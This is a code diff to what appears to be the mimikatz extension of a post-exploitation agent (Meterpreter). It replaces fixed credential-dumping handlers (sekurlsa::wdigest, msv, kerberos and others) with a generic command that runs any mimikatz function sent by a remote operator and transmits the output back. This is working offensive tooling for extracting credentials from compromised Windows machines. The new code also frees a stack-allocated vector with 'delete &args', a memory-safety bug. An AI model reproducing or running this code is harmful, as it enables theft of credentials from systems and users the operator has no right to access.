@@ -4,8 +4,6 @@
 	Licence : http://creativecommons.org/licenses/by/3.0/fr/
 */
 #include "main.h"
-#include <iostream>
-#include <fstream>
 
 extern "C" 
 {
@@ -47,82 +45,48 @@ wchar_t* convert_wstring_to_wchar_t(wstring in)
 	return out;
 }
 
-DWORD mimikatz_command(Remote *remote, Packet *packet, wstring function)
+std::wstring s2ws(const std::string& str)
+{
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+    std::wstring wstrTo( size_needed, 0 );
+    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
+    return wstrTo;
+}
+
+DWORD request_custom_command(Remote *remote, Packet *packet)
 {
 	Packet * response = packet_create_response(packet);
+	Tlv argTlv             = {0};
+	DWORD index            = 0;
+	vector<wstring> args;
+
+	wstring function = s2ws(packet_get_tlv_value_string(packet, TLV_TYPE_MIMIKATZ_FUNCTION));
+
+	while( packet_enum_tlv( packet, index++, TLV_TYPE_MIMIKATZ_ARGUMENT, &argTlv ) == ERROR_SUCCESS )
+	{
+		args.push_back(s2ws((PCHAR)argTlv.buffer));
+	}
 
 	clear_buffer();
 
-	vector<wstring> *args = new vector<wstring>();
-
 	initialize_mimikatz();
-	myMimiKatz->doCommandeLocale(&function, args);
-	delete args;
+	myMimiKatz->doCommandeLocale(&function, &args);
+	delete &args;
 
 	wchar_t* output = convert_wstring_to_wchar_t(oss.str());
 	
 	clear_buffer();
 
-	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
+	packet_add_tlv_raw(response, TLV_TYPE_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
 	packet_transmit_response(ERROR_SUCCESS, remote, response);
 
 	return ERROR_SUCCESS;	
 }
 
-DWORD request_wdigest(Remote *remote, Packet *packet)
-{
-	return mimikatz_command(remote, packet, L"sekurlsa::wdigest");
-}
-
-DWORD request_msv1_0(Remote *remote, Packet *packet)
-{
-	return mimikatz_command(remote, packet, L"sekurlsa::msv");
-}
-
-DWORD request_livessp(Remote *remote, Packet *packet)
-{
-	return mimikatz_command(remote, packet, L"sekurlsa::livessp");
-}
-
-DWORD request_ssp(Remote *remote, Packet *packet)
-{
-	return mimikatz_command(remote, packet, L"sekurlsa::ssp");
-}
-
-DWORD request_tspkg(Remote *remote, Packet *packet)
-{
-	return mimikatz_command(remote, packet, L"sekurlsa::tspkg");	
-}
-
-DWORD request_kerberos(Remote *remote, Packet *packet)
-{
-	return mimikatz_command(remote, packet, L"sekurlsa::kerberos");	
-}
-
 Command customCommands[] =
 {
-	{ "mimikatz_wdigest",
-	  { request_wdigest,                                { 0 }, 0 },
-	  { EMPTY_DISPATCH_HANDLER                                   },
-	},
-	{ "mimikatz_msv1_0",
-	  { request_msv1_0,                                 { 0 }, 0 },
-	  { EMPTY_DISPATCH_HANDLER                                   },
-	},
-	{ "mimikatz_livessp",
-	  { request_livessp,                                { 0 }, 0 },
-	  { EMPTY_DISPATCH_HANDLER                                   },
-	},
-	{ "mimikatz_ssp",
-	  { request_ssp,                                    { 0 }, 0 },
-	  { EMPTY_DISPATCH_HANDLER                                   },
-	},
-	{ "mimikatz_tspkg",
-	  { request_tspkg,                                  { 0 }, 0 },
-	  { EMPTY_DISPATCH_HANDLER                                   },
-	},
-	{ "mimikatz_kerberos",
-	  { request_kerberos,                               { 0 }, 0 },
+	{ "mimikatz_custom_command",
+	  { request_custom_command,                                { 0 }, 0 },
 	  { EMPTY_DISPATCH_HANDLER                                   },
 	},
 	// Terminator
